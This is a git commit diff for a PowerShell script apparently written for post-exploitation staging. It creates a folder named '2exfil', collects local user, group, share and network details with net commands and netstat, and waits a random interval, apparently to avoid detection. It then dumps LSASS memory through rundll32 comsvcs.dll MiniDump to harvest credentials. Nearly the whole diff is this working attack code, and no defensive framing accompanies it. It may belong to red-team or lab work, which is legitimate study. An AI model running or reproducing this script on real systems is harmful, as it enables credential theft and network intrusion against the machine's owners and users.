4949f35a010729f125dbe1d158d65451a09fd0a8
encryptedSubject <148569257+encryptedSubject@users.noreply.github.com>
2023-11-10 11:38:07 -0500

    Update kS1.ps1

--- stage/kS1.ps1
+++ stage/kS1.ps1
@@ -1,3 +1,16 @@
-Mkdir c:\temp\exfil
+mkdir c:\temp\2exfil
+$Path = c:\temp\2exfil\AccountInfo.txt
+$Path2 = c:\temp\2exfil\NetworkInfo.txt
+net user >> $Path
+net localgroup >> $Path
+net group >> $Path
+net use >> $Path
+net share >> $Path  
+net view >> $Path
+net accounts >> $Path
+Netstat -a >> $Path2
+
+Start-Sleep (Get-Random -min 60 -max 120)
+
 $P = get-process lsass |select -expand id
-C:\windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump $P c:\temp\exfil\testclone.txt full
+C:\windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump $P c:\temp\2exfil\dump.txt full
